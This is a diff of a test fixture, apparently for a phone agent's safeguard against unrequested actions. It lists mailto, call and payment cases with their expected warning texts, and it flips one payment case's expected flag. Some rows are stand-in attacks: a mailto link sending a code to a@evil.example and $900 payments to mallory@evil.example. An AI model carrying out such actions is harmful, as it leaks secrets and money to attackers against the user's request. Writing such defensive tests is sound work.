@@ -11,7 +11,7 @@ open mailto:x@evil.example?subject=hi&body=yo	SendMessage	true	"Open a mailto li
 open mailto:?cc=a@evil.example&body=Code%20482913	SendMessage	true	"Open a mailto link that was not in your request, to \"a@evil.example\". Sends: body: \"Code%(redacted number)\""
 open tel:+15551234567	Call	true	"Open tel:+15551234567"
 open tel given	Call	false	"Open tel:+15551234567"
-weak head alone	Payment	false	"Tap \"Send money\" in Example. Sends: Account (shown above); Amount: \"$900.00\"; 'Who are you paying?': \"mallory@evil.example\". Amounts on screen: Amount: $900.00. To/Account: Account: \"Everyday Checking 4521\". Recipient not verified"
+weak head alone	Payment	true	"Tap \"Send money\" in Example. Sends: Account (shown above); Amount: \"$900.00\"; 'Who are you paying?': \"mallory@evil.example\". Amounts on screen: Amount: $900.00. To/Account: Account: \"Everyday Checking 4521\". Recipient not verified"
 strong and weak heads	Payment	false	"Tap \"Send money\" in Example. Sends: To (shown above); Account (shown above). To/Account (2 different): To: \"alice@example.com\"; Account: \"Everyday Checking 4521\""
 presumed money Recipient/How much?	Payment	true	"Tap \"Continue\" in Example. Sends: Recipient (shown above); 'How much?': \"900\". Amounts on screen: 'How much?': 900. To/Account: Recipient: \"mallory@evil.example\""
 presumed money To/Memo	Payment	true	"Tap \"Continue\" in Example. Sends: To (shown above); Memo: \"$900\". Amounts on screen: Memo: $900. To/Account: To: \"mallory@evil.example\""
